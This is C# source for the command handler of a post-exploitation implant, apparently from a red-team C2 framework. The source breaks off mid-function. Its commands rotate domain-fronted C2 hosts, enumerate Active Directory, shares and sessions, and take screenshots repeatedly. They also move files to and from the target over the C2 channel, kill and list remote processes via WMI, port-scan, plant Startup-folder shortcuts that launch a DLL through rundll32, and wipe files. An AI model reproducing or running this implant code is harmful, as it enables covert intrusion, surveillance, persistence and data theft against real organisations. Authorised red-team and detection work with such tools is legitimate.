using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.DirectoryServices.AccountManagement;
using System.Net;
using System.IO;
using System.Reflection;
using IWshRuntimeLibrary;
using System.Diagnostics;
using Core.Common;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO.Compression;
using Core.CredPopper;
using Core.WindowsInternals;
using System.Collections;

namespace Core
{
    internal class Core
    {
        private static CredentialResult _captureCreds;

        [CoreDispatch(Description = "Displays the help for core", Usage = "Usage: Help")]
        public static void Help()
        {
            Program.PrintHelp();
        }

        [CoreDispatch(Description = "Displays the core help for core", Usage = "Usage: CoreHelp")]
        public static void CoreHelp()
        {
            Program.PrintHelp();
        }


        [CoreDispatch(Description = "Used for testing arguments and output", Usage = "Usage: Echo \"Param1\" \"Param2\"")]
        public static void Echo(IEnumerable<string> args)
        {
            foreach (var arg in args)
            {
                Console.WriteLine($"Arg: {arg}");
            }

            foreach (var arg in Program.ARGUMENTS)
            {
                Console.WriteLine($"ArgKey: {arg.Key}");
                Console.WriteLine($"ArgValue: {arg.Value}");
            }
        }

        [CoreDispatch(Description = "Used for setting up comms domain fronting headers for rotation",
            Usage = "Usage: dfupdate \"endpoint1.cloudfront.net\",\"endpoint2.cloudfront.net\"")]
        public static void DFUpdate(string[] args)
        {
            Comms.DFUpdate(args[1]);
        }

        [CoreDispatch(Description = "Used to get comms rotation values", Usage = "Usage: get-rotation")]
        public static void GetRotation()
        {
            var x = Comms.GetRotate();
            foreach (var y in x)
            {
                Console.WriteLine($"Rotation: {y}");
            }

            var xx = Comms.GetDF();
            foreach (var yy in xx)
            {
                Console.WriteLine($"DomainFront: {yy}");
            }
        }

        [CoreDispatch(Description = "Performs an netapi32.dll NetShareEnum", Usage = "Usage: netshareenum server1,server2")]
        public static void NetShareEnum(string[] args)
        {
            try
            {
                if (args[1].IndexOf(",", StringComparison.Ordinal) != -1)
                {
                    foreach (var varName in args[1].Split(','))
                    {
                        ActiveDirectory.ActiveDirectory.NetShareEnum(varName);
                    }

                    return;
                }

                ActiveDirectory.ActiveDirectory.NetShareEnum(args[1]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running NetShareEnum: {e}");
            }
        }

        [CoreDispatch(Description = "Performs an netapi32.dll NetSessionEnum", Usage = "Usage: netsessionenum server1,server2")]
        public static void NetSessionEnum(string[] args)
        {
            try
            {
                if (args[1].IndexOf(",", StringComparison.Ordinal) != -1)
                {
                    foreach (var varName in args[1].Split(','))
                    {
                        ActiveDirectory.ActiveDirectory.NetSessionEnumFunc(varName);
                    }

                    return;
                }

                ActiveDirectory.ActiveDirectory.NetSessionEnumFunc(args[1]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running LocalSessionEnum: {e}");
            }
        }

        [CoreDispatch(Description = "Performs an WinNT GroupName Query", Usage = "Usage: localgroupmember server1.blorebank.local administrators")]
        public static void LocalGroupMember(string[] args)
        {
            try
            {
                if (args.Length > 2)
                {
                    ActiveDirectory.ActiveDirectory.LocalGroupMember(args[1], args[2]);
                }
                else
                {
                    ActiveDirectory.ActiveDirectory.LocalGroupMember(args[1], null);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running localgroupmember: {e}");
            }
        }

        [CoreDispatch(Description = "Performs an ACL check on either a folder or file", Usage = "Usage: get-acl c:\\temp\\test.exe")]
        public static void GetACL(string[] args)
        {
            try
            {
                var attr = System.IO.File.GetAttributes(args[1]);
                if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                {
                    Console.WriteLine($"[+] Get-ACL on Folder Path: {args[1]}");
                    FileSystem.File.GetFolderACL(args[1]);
                }
                else
                {
                    Console.WriteLine($"[+] Get-ACL on File Path: {args[1]}");
                    FileSystem.File.GetFileACL(args[1]);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running get-acl: {e}");
            }
        }

        [CoreDispatch(Description = "Performs an query using GetLastAccessTime", Usage = "Usage: fileaccesstime c:\\temp\\test.exe")]
        public static void FileAccessTime(string[] args)
        {
            try
            {
                var dt = System.IO.File.GetLastAccessTime(args[1]);
                Console.WriteLine($"The last access time for {args[1]} was {dt}.");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running localgroupmember: {e}");
            }
        }

        [CoreDispatch(Description = "Performs an LDAP Search Query",
            Usage =
                "Usage: Ldap-Searcher \"(&(objectCategory=user)(samaccountname=user))\" \"LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local\" <optional-properties> <optional-resolve>")]
        public static void LdapSearcher(string[] args)
        {
            try
            {
                if (args.Length > 4)
                {
                    ActiveDirectory.ActiveDirectory.AdSearcher(args[1], args[2], args[3], false, true);
                }
                else if (args.Length > 3)
                {
                    ActiveDirectory.ActiveDirectory.AdSearcher(args[1], args[2], args[3]);
                }
                else if (args.Length > 2)
                {
                    ActiveDirectory.ActiveDirectory.AdSearcher(args[1], args[2], null);
                }
                else
                {
                    ActiveDirectory.ActiveDirectory.AdSearcher(args[1], null, null);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running ADSearcher: {e}");
            }
        }

        [CoreDispatch(Description = "Performs an Recursive LDAP Search Query",
            Usage =
                "Usage: ldap-searcher-recursive \"(&(objectCategory=group)(samaccountname=Domain Admins))\" \"LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local\" <optional-properties>")]
        public static void LdapSearcherRecursive(string[] args)
        {
            try
            {
                if (args.Length > 3)
                {
                    ActiveDirectory.ActiveDirectory.AdSearcher(args[1], args[2], args[3], true);
                }
                else if (args.Length > 2)
                {
                    ActiveDirectory.ActiveDirectory.AdSearcher(args[1], args[2], null, true);
                }
                else
                {
                    ActiveDirectory.ActiveDirectory.AdSearcher(args[1], null, null, true);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running ADSearcher Recursively: {e}");
            }
        }

        [CoreDispatch(Description = "Used for setting up comms host rotation",
            Usage = "Usage: rotate \"https://endpoint1.cloudfront.net\",\"https://endpoint2.cloudfront.net\"")]
        public static void Rotate(string[] args)
        {
            Comms.Rotate(args[1]);
        }

        [CoreDispatch(Description = "Gets the virtual screen size", Usage = "Usage: get-screensize")]
        public static void GetScreenSize()
        {
            try
            {
                Host.Screenshot.GetScreenSize();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen size capture: {e}");
            }
        }

        [CoreDispatch(Description = "Performs a screenshot of the open desktop", Usage = "Usage: get-screenshot <width-optional> <height-optional>")]
        public static void GetScreenshot(string[] args)
        {
            try
            {
                if (args.Length == 3)
                {
                    Host.Screenshot.GetScreenshot(int.Parse(args[1]), int.Parse(args[2]));
                }
                else
                {
                    Host.Screenshot.GetScreenshot();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e}");
            }
        }

        [CoreDispatch(Description = "Performs a screenshot of all open windows", Usage = "Usage: get-screenshotallwindows")]
        public static void GetScreenshotAllWindows()
        {
            try
            {
                Host.Screenshot.ScreenshotAllWindows();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e}");
            }
        }

        [CoreDispatch(Description = "Performs a screenshot of the users desktop every x minutes/seconds indefinitely until stop-screenshotmulti is run",
            Usage = "Usage: get-screenshotMulti 2m <optional-width> <optional-height>")]
        public static void GetScreenshotMulti(string[] args)
        {
            try
            {
                if (args.Length == 3)
                {
                    Host.Screenshot.screenshotInterval = Common.Timer.CheckTime(args[1]);
                    Host.Screenshot.screenshotEnabled = true;
                    Host.Screenshot.RunMultiScreenshot(int.Parse(args[2]), int.Parse(args[3]));
                }
                else
                {
                    Host.Screenshot.screenshotInterval = Common.Timer.CheckTime(args[1]);
                    Host.Screenshot.screenshotEnabled = true;
                    Host.Screenshot.RunMultiScreenshot();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Could not start multi screenshotter: {e}");
            }
        }

        [CoreDispatch(Description = "Terminates the multi screenshot thread", Usage = "Usage: Stop-ScreenshotMulti")]
        public static void StopScreenshotMulti()
        {
            try
            {
                Console.WriteLine("[-] Stopped multi screenshotter");
                Host.Screenshot.screenshotEnabled = false;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Stopped multi screenshotter: {e}");
            }
        }

        [CoreDispatch(Description = "Used for getting the publically available methods of a loaded module", Usage = "Usage: get-methods Core.Program Core")]
        public static void GetMethods(string[] args)
        {
            try
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("Usage: get-methods Core.Program Core");
                    return;
                }

                var assemblyName = args[2];
                var typeName = args[1];
                foreach (var assembly in AppDomain.CurrentDomain.GetAssemblies())
                {
                    if (assembly.FullName.ToLower().StartsWith(assemblyName.ToLower()))
                    {
                        Console.WriteLine(assemblyName);
                        var type = Utils.LoadAssembly($"{typeName}, {assembly.FullName}");
                        var methods = type.GetMethods();
                        Console.WriteLine($"The methods of the {assemblyName} class are:\n");
                        foreach (var method in methods)
                        {
                            Console.WriteLine(method.Name);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get methods: {e}");
            }
        }

        [CoreDispatch(Description = "Used for listing the modules loaded in the local AppDomain", Usage = "Usage: list-modules")]
        public static void ListModules()
        {
            try
            {
                var appd = AppDomain.CurrentDomain.GetAssemblies();
                Console.WriteLine("[+] Modules loaded:\n");
                foreach (var ass in appd)
                {
                    Console.WriteLine(ass.FullName);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot list modules: {e}");
            }
        }

        [CoreDispatch(Description = "Used for uploading a file to the target", Usage = "Usage: upload-file \"SourceBase64\" \"DestinationFilePath\"")]
        public static void UploadFile(string[] args)
        {
            try
            {
                var splitArgs = args[1].Split(new[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
                var fileBytes = Convert.FromBase64String(splitArgs[0]);
                System.IO.File.WriteAllBytes(splitArgs[1].Replace("\"", ""), fileBytes);
                Console.WriteLine($"Uploaded file to: {splitArgs[1]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot upload file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for downloading a file from the target, if bigger than 50737418 bytes, it will chunk this over multiple requests",
            Usage = "Usage: download-file \"SourceFilePath\"")]
        public static void DownloadFile(string[] args)
        {
            try
            {
                var fileName = args[1];
                var chunkSize = 50737418;
                var fileSize = new FileInfo(fileName).Length;
                var totalChunks = Math.Ceiling((double)fileSize / chunkSize);
                if (totalChunks < 1)
                {
                    totalChunks = 1;
                }

                var totalChunkStr = totalChunks.ToString("00000");
                var totalChunkByte = Encoding.UTF8.GetBytes(totalChunkStr);
                var chunk = 1;
                using Stream input = System.IO.File.OpenRead(fileName);
                var buffer = new byte[chunkSize];
                using var ms = new MemoryStream();
                while (true)
                {
                    var read = input.Read(buffer, 0, buffer.Length);
                    if (read <= 0)
                        break;
                    ms.Write(buffer, 0, read);
                    var chunkStr = chunk.ToString("00000");
                    var chunkedByte = Encoding.UTF8.GetBytes(chunkStr);
                    var preNumbers = new byte[10];
                    preNumbers = Utils.Combine(chunkedByte, totalChunkByte);
                    Comms.Exec("", Utils.Combine(preNumbers, ms.ToArray()));
                    chunk++;
                    ms.SetLength(0);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot download-file: {e}");
            }
        }

        [CoreDispatch(Description = "Used to stop monitoring the power status of the machine", Usage = "Usage: stop-powerstatus")]
        public static void StopPowerStatus()
        {
            Assembly lTyp = null;
            try
            {
                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
            }
            catch (NullReferenceException)
            {
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
            }

            try
            {
                lTyp.GetType("Program").GetField("Lop", BindingFlags.Public | BindingFlags.Static).SetValue(null, false);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
            }

            Console.WriteLine("[-] Stopped powerstatus checking");
        }

        [CoreDispatch(Description = "Used for start monitoring the power status of the machine", Usage = "Usage: loadpowerstatus")]
        public static void LoadPowerStatus()
        {
            try
            {
                var asm = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "PwrStatusTracker");
                var t = asm.GetType("PwrStatusTracker.PwrFrm");
                var tpwn = asm.GetType("PwrStatusTracker.PwrNotifier");
                dynamic pwnr = Activator.CreateInstance(tpwn);
                var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
                var taskIdstr = lTyp.GetType("Program").GetField("taskId").GetValue(null);
                pwnr.taskid = $"{taskIdstr}-pwrstatusmsg";
                var m = t.GetMethod("CreatePwrFrmAsync");
                m.Invoke(null, new object[] { pwnr });
            }
            catch (NullReferenceException)
            {
            }
            catch (Exception e)
            {
                Comms.Exec($"[-] Error in loadpowerstatus: {e}");
            }
        }

        [CoreDispatch(Description = "Used to kill a target process", Usage = "Usage: kill-process 1357")]
        public static void KillProcess(string[] args)
        {
            try
            {
                var proc = Process.GetProcessById(int.Parse(args[1]));
                proc.Kill();
                Console.WriteLine($"[+] Process terminated: {args[1]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Failed to terminate process: {e}");
            }
        }

        [CoreDispatch(Description = "Used to kill a remote target process using WMI", Usage = "Usage: kill-remote-process 1357 DESKTOP-2NCNQ59")]
        public static void KillRemoteProcess(string[] args)
        {
            try
            {
                int proc = int.Parse(args[1]);
                string hostname = args[2];

                Console.WriteLine("[+] Process ID: {0}", proc);
                Console.WriteLine("[+] Computer: {0}", hostname);
                WMI.WMI.WMIKillProcess(hostname, proc);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Failed to terminate process: {e}");
            }
        }


        [CoreDispatch(Description = "Used to start a portscan against a target", Usage = "Usage: portscan \"Host1,Host2\" \"80,443,3389\" \"1\" \"100\"")]
        public static void PortScan(string[] args)
        {
            var iDelay = 1;
            var iThreads = 100;
            try
            {
                int.TryParse(args[3], out iDelay);
                int.TryParse(args[4], out iThreads);
                iDelay = iDelay * 1000;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error parsing int args: {e}");
            }

            var assembly = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(i => i.GetName().Name == "PortScanner-Dll");
            if (assembly == null)
            {
                Console.WriteLine("PortScanner-Dll assembly not found");
                return;
            }

            var type = assembly.GetType("PortScanner_Dll.Scanner.TCPConnectScanner");

            Activator.CreateInstance(type);
            object[] argObj = { args[1], args[2], iDelay, iThreads, false, true, -1, false };
            var m = type.GetMethod("PerformTCPConnectScan");

            var x = type.GetProperty("VisualResults");
            x.SetValue(x, false);

            var pfrm = m.Invoke(null, argObj);
            var pscanResults = type.GetProperty("Results").GetValue(pfrm).ToString();
            Console.WriteLine(pscanResults);
        }

        [CoreDispatch(Description = "Used to start a new daisy server", Usage = "Usage: invoke-daisychain <args>")]
        public static void InvokeDaisyChain(string[] args)
        {
            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "Daisy");
            lTyp.GetType("DaisyServer").GetField("boolListener", BindingFlags.Public | BindingFlags.Static).SetValue(null, true);
            var urls = args[9].Split(',');
            lTyp.GetType("DaisyServer").GetField("httpserver", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[1]);
            lTyp.GetType("DaisyServer").GetField("httpserverport", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[2]);
            lTyp.GetType("DaisyServer").GetField("server", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[3]);
            lTyp.GetType("DaisyServer").GetField("domainfrontheader", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[4]);
            lTyp.GetType("DaisyServer").GetField("proxyurl", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[5]);
            lTyp.GetType("DaisyServer").GetField("proxyuser", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[6]);
            lTyp.GetType("DaisyServer").GetField("proxypassword", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[7]);
            lTyp.GetType("DaisyServer").GetField("useragent", BindingFlags.Public | BindingFlags.Static).SetValue(null, args[8]);
            lTyp.GetType("DaisyServer").GetField("URLs", BindingFlags.Public | BindingFlags.Static).SetValue(null, urls);
            lTyp.GetType("DaisyServer").GetField("referer", BindingFlags.Public | BindingFlags.Static).SetValue(null, "");
            Console.WriteLine($"[+] Started Daisy Server on background thread: http://{args[1]}:{args[2]}");
            ThreadPool.QueueUserWorkItem((state) =>
            {
                lTyp.GetType("DaisyServer").InvokeMember("StartDaisy", BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null);
            });
        }

        [CoreDispatch(Description = "Used to stop daisy server", Usage = "Usage: stop-daisy")]
        public static void StopDaisy()
        {
            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "Daisy");
            lTyp.GetType("DaisyServer").GetField("boolListener", BindingFlags.Public | BindingFlags.Static).SetValue(null, false);
            Console.WriteLine("[-] Stopped Daisy Server");
        }

        [CoreDispatch(Description = "Used to start a new process or run a program, e.g ipconfig.exe", Usage = "Usage: start-process net.exe -argumentlist users")]
        public static void StartProcess(string[] args)
        {
            try
            {
                var process = new Process { StartInfo = { UseShellExecute = false } };
                process.StartInfo.RedirectStandardOutput = process.StartInfo.RedirectStandardError = process.StartInfo.CreateNoWindow = true;
                process.StartInfo.FileName = args[1];
                if (args.Length > 2)
                {
                    process.StartInfo.Arguments = args[2];
                }

                process.Start();
                Console.WriteLine(process.StandardOutput.ReadToEnd());
                Console.WriteLine(process.StandardError.ReadToEnd());
                process.WaitForExit();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot start process: {e}");
            }
        }

        [CoreDispatch(Description = "Used to start a new process or run a program silently and not wait for output",
            Usage = "Usage: start-process-silent \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -argumentlist www.recruitment.com/survey")]
        public static void StartProcessSilent(string[] args)
        {
            try
            {
                var process = new Process { StartInfo = { UseShellExecute = false } };
                process.StartInfo.RedirectStandardOutput = process.StartInfo.RedirectStandardError = process.StartInfo.CreateNoWindow = true;
                process.StartInfo.FileName = args[1];

                if (args.Length > 2)
                {
                    process.StartInfo.Arguments = args[2];
                }

                process.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot start process: {e}");
            }
        }

        [CoreDispatch(Description = "Used to run a shortcut, e.g test.lnk", Usage = "Usage: start-shortcut c:\\users\\public\\test.lnk")]
        public static void StartShortcut(string[] args)
        {
            try
            {
                Process.Start(args[1]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot start shortcut: {e}");
            }
        }

        [CoreDispatch(Description = "Used for creating a lnk file",
            Usage =
                "Usage: create-lnk C:\\Users\\userName\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Cisco.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc")]
        public static void CreateLnk(string[] args)
        {
            try
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("Not enough args");
                    Console.WriteLine(
                        "Usage: Create-Lnk C:\\Users\\userName\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Cisco.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc");
                }
                else if (args.Length == 4)
                {
                    try
                    {
                        var tLoc = args[1].Replace("\"", "");
                        var shell = new WshShell();
                        var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                        shortcut.Arguments = $@"{args[3].Replace("\"", "")}";
                        shortcut.TargetPath = $@"{args[2].Replace("\"", "")}";
                        shortcut.Save();
                        Console.WriteLine("Written shortcut file:");
                        Console.WriteLine($"[+] {tLoc}");
                        Console.WriteLine($"[+] {args[2]} {args[3]}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error writing shortcut file: {e}");
                    }
                }
                else if (args.Length == 3)
                {
                    try
                    {
                        var tLoc = args[1].Replace("\"", "");
                        var shell = new WshShell();
                        var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                        shortcut.Arguments = @"";
                        shortcut.TargetPath = args[2].Replace("\"", "");
                        shortcut.Save();
                        Console.WriteLine("Written shortcut file:");
                        Console.WriteLine($"[+] {tLoc}");
                        Console.WriteLine($"[+] {args[2]}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Error writing shortcut file2: {e}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot create lnk file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for creating a startup lnk file",
            Usage = "Usage: create-startuplnk OneNote.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc")]
        public static void CreateStartupLnk(string[] args)
        {
            try
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("Not enough args");
                    Console.WriteLine("Usage: Create-StartupLnk OneNote.lnk c:\\windows\\system32\\rundll32.exe c:\\users\\public\\wkrp.dll,VoidFunc");
                }
                else if (args.Length == 4)
                {
                    var userName = Environment.UserName;
                    var tLoc = $@"C:\Users\{userName}\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{args[1]}";
                    Console.WriteLine("Written shortcut file:");
                    Console.WriteLine($"[+] {tLoc}");
                    Console.WriteLine($"[+] {args[2]} {args[3]}");
                    var shell = new WshShell();
                    var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                    shortcut.Arguments = $@"{args[3]}";
                    shortcut.TargetPath = $@"{args[2]}";
                    shortcut.Save();
                }
                else if (args.Length == 3)
                {
                    var userName = Environment.UserName;
                    var tLoc = $@"C:\Users\{userName}\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{args[1]}";
                    Console.WriteLine("Written shortcut file:");
                    Console.WriteLine($"[+] {tLoc}");
                    Console.WriteLine($"[+] {args[2]}");
                    var shell = new WshShell();
                    var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                    shortcut.Arguments = @"";
                    shortcut.TargetPath = $@"{args[2]}";
                    shortcut.Save();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot create lnk file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for making a new directory", Usage = "Usage: zip c:\\temp\\ c:\\users\\public\\temp.zip")]
        public static void Zip(string[] args)
        {
            try
            {
                ZipFile.CreateFromDirectory(args[1], args[2]);
                Console.WriteLine($"[+] ZipFile created: {args[1]} -> {args[2]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot make ZipFile: {e}");
            }
        }


        [CoreDispatch(Description = "Used for unzipping a file", Usage = "Usage: unzip c:\\temp\\test.zip c:\\temp\\")]
        public static void Unzip(string[] args)
        {
            try
            {
                ZipFile.ExtractToDirectory(args[1], args[2]);
                Console.WriteLine($"[+] Unzip: {args[1]} {args[2]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot unzip file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for making a new directory", Usage = "Usage: mkdir c:\\temp\\")]
        public static void MkDir(string[] args)
        {
            try
            {
                Directory.CreateDirectory(args[1]);
                Console.WriteLine($"[+] Directory created: {args[1]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot make directory: {e}");
            }
        }

        [CoreDispatch(Description = "Used for moving a file from one location to another. Will overwrite any existing file.",
            Usage = "Usage: Move c:\\temp\\old.exe C:\\temp\\new.exe")]
        public static void Move(string[] args)
        {
            try
            {
                var sourceFileName = $@"{args[1].Replace("\"", "")}";
                var destFileName = $@"{args[2].Replace("\"", "")}";

                if (System.IO.File.Exists(destFileName))
                {
                    System.IO.File.Delete(destFileName);
                }

                System.IO.File.Move(sourceFileName, destFileName);
                Console.WriteLine($"[+] Moved successfully to {args[2]} ");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot move file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for copying a file from one location to another. Will overwrite any existing file.",
            Usage = "Usage: copy c:\\temp\\test.exe c:\\temp\\test2.exe ")]
        public static void Copy(string[] args)
        {
            try
            {
                var sourceFileName = $@"{args[1].Replace("\"", "")}";
                var destFileName = $@"{args[2].Replace("\"", "")}";

                if (System.IO.File.Exists(sourceFileName))
                {
                    System.IO.File.Copy(sourceFileName, destFileName);
                }

                if (System.IO.File.Exists(destFileName))
                {
                    Console.WriteLine($"[+] Copied file successfully to {args[2]} ");
                }
                else
                {
                    Console.WriteLine("[-] File copy failed");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot copy file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for printing the implant working directory", Usage = "Usage: pwd")]
        public static void PWD()
        {
            GetCurrentWorkingDirectory();
        }

        [CoreDispatch(Description = "Get the current working directory for the implant", Usage = "Usage: get-currentworkingdirectory")]
        public static void GetCurrentWorkingDirectory()
        {
            try
            {
                var path = Directory.GetCurrentDirectory();
                Console.WriteLine($"[+] Current Working Directory Set to: {path}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to GetCurrentDirectory: {e.Message}");
            }
        }

        [CoreDispatch(Description = "Sets the current working directory for the implant", Usage = "Usage: cd C:\\Users\\Public\\")]
        public static void CD(string[] args)
        {
            SetCurrentWorkingDirectory(args);
        }

        [CoreDispatch(Description = "Sets the current working directory for the implant", Usage = "Usage: set-currentworkingdirectory C:\\Users\\Public\\")]
        public static void SetCurrentWorkingDirectory(string[] args)
        {
            try
            {
                Directory.SetCurrentDirectory(args[1]);
                var path = Directory.GetCurrentDirectory();
                Console.WriteLine($"[+] Current Working Directory Set to: {path}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to SetCurrentDirectory: {e.Message}");
            }
        }

        [CoreDispatch(Description = "Used for deleting a file from the file system", Usage = "Usage: del c:\\temp\\test.exe")]
        public static void Del(string[] args)
        {
            try
            {
                Console.WriteLine("[+] Deleting file:\n");
                if (!System.IO.File.Exists($@"{args[1].Replace("\"", "")}"))
                {
                    Console.WriteLine($"[-] Could not find file: {args[1]}");
                }
                else
                {
                    System.IO.File.Delete($@"{args[1].Replace("\"", "")}");
                    if (System.IO.File.Exists($@"{args[1].Replace("\"", "")}"))
                    {
                        Console.WriteLine($"[-] Could not delete file: {args[1]}");
                    }
                    else
                    {
                        Console.WriteLine($"[+] Deleted file: {args[1]}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot delete file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for checking a specific process on a remote host using WMI",
            Usage = "Usage: get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]")]
        public static void GetRemoteProcessListing(string[] args)
        {
            try
            {
                if (args.Length < 2 || args.Length > 6)
                {
                    Console.WriteLine("[!] Invalid number of arguments.");
                    Console.WriteLine("[!] Usage: get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]");
                }
                else
                {
                    var machineNameArg = args[1];
                    var processName = "";
                    var username = "";
                    var password = "";
                    var domain = "";
                    //User has provided a host and a process name
                    if (args.Length == 3)
                    {
                        processName = args[2];
                    }
                    //User has provided a host and alternate credentials
                    else if (args.Length == 5)
                    {
                        username = args[2];
                        domain = args[3];
                        password = args[4];
                    }
                    //User has provided a host, a process name and alternate credentials
                    else if (args.Length == 6)
                    {
                        processName = args[2];
                        username = args[3];
                        domain = args[4];
                        password = args[5];
                    }
                    else
                    {
                        Console.WriteLine("[!] Invalid number of arguments.");
                        Console.WriteLine("[!] Usage: get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]");
                    }

                    var tasks = new List<Task>();

                    var computerList = machineNameArg.Split(',').ToList();

                    computerList.ForEach(x =>
                    {
                        var t = Task.Run(() => WMI.WMI.WMITaskList(x, processName, username, password, domain));
                        tasks.Add(t);
                    });

                    Task.WaitAll(tasks.ToArray());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error running getremoteprocesslisting: {e}");
            }
        }

        [CoreDispatch(Description = "Used for checking all processes on a remote host using WMI", Usage = "Usage: get-remoteprocesslistingall HOSTNAME1,HOSTNAME2")]
        public static void GetRemoteProcessListingAll(string[] args)
        {
            GetRemoteProcessListing(args);
        }

        [CoreDispatch(Description = "Used for deleting a folder from the file system", Usage = "Usage: rmdir c:\\temp\\")]
        public static void RMDir(string[] args)
        {
            try
            {
                Directory.Delete(args[1]);
                Console.WriteLine($"Deleted folder {args[1]}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"Error deleting folder {e.Message}");
            }
        }

        [CoreDispatch(Description = "Used for securely deleting a file from the file system by overwriting the file first", Usage = "Usage: posh-delete c:\\temp\\test.exe")]
        public static void PoshDelete(string[] args)
        {
            //https://www.codeproject.com/KB/cs/SharpWipe/sharpwipe_src.zip
            try
            {
                Console.WriteLine("[+] Deleting file:\n");
                if (!System.IO.File.Exists($@"{args[1].Replace("\"", "")}"))
                {
                    Console.WriteLine($"[-] Could not find file: {args[1]}");
                }
                else
                {
                    var filename = $@"{args[1].Replace("\"", "")}";
                    try
                    {
                        if (System.IO.File.Exists(filename))
                        {
                            // Set the files attributes to normal in case it's read-only.
                            System.IO.File.SetAttributes(filename, FileAttributes.Normal);

                            // Calculate the total number of sectors in the file.
                            var sectors = Math.Ceiling(new FileInfo(filename).Length / 512.0);

                            // Create a dummy-buffer the size of a sector.
                            var dummyBuffer = new byte[512];

                            // Create a cryptographic Random Number Generator.
